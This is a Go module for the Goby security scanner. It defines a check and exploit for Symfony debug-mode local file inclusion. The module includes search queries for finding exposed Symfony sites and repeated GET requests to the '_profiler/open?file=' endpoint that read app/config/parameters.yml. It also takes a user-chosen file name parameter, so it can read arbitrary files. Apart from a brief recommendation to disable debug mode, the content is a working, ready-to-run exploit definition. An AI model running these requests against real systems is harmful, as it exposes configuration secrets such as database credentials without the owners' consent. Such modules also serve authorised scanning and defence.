package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Symfony framework debug Local File Inclusion",
    "Description": "<p>The web application uses Symfony framework. Symfony Debug mode is enabled. Debug mode should be turned off in production environment, as it leads to disclosure of sensitive information about the web application.</p>",
    "Impact": "Symfony framework debug Local File Inclusion",
    "Recommendation": "<p>disable debug mode,References: <a href=\"https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode\">https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode</a> </p>",
    "Product": "Symfony Framework",
    "VulType": [
        "File Inclusion"
    ],
    "Tags": [
        "File Inclusion"
    ],
    "Translation": {
        "CN": {
            "Name": "Symfony framework debug 存在任意文件读取漏洞",
            "Description": "<p>web应用程序使用Symfony框架。Symfony调试模式启用。调试模式应该在生产环境中关闭，因为它会导致有关web应用程序的敏感信息泄露。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。\t<br></p>",
            "Recommendation": "<p>关闭调试模式，参考：<a href=\"https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode\">https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode</a></p>",
            "Product": "Symfony Framework",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Symfony framework debug Local File Inclusion",
            "Description": "<p>The web application uses Symfony framework. Symfony Debug mode is enabled. Debug mode should be turned off in production environment, as it leads to disclosure of sensitive information about the web application.<br></p>",
            "Impact": "Symfony framework debug Local File Inclusion",
            "Recommendation": "<p><br>disable debug mode,References: <a href=\"https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode\">https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode</a> </p>",
            "Product": "Symfony Framework",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "FofaQuery": "body=\"/vendor/symfony\" || body=\"Symfony Exception\"",
    "GobyQuery": "body=\"/vendor/symfony\" || body=\"Symfony Exception\"",
    "Author": "sharecast",
    "Homepage": "https://symfony.com/",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/app_dev.php/_profiler/open?file=app/config/parameters.yml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "parameters:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<a class=\"anchor\" name=\"line1\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/_profiler/open?file=app/config/parameters.yml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "parameters:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<a class=\"anchor\" name=\"line1\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/app_dev.php/_profiler/open?file=app/config/parameters.yml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "parameters:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<a class=\"anchor\" name=\"line1\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/_profiler/open?file=app/config/parameters.yml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "parameters:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<a class=\"anchor\" name=\"line1\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "app/config/parameters.yml",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10262"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
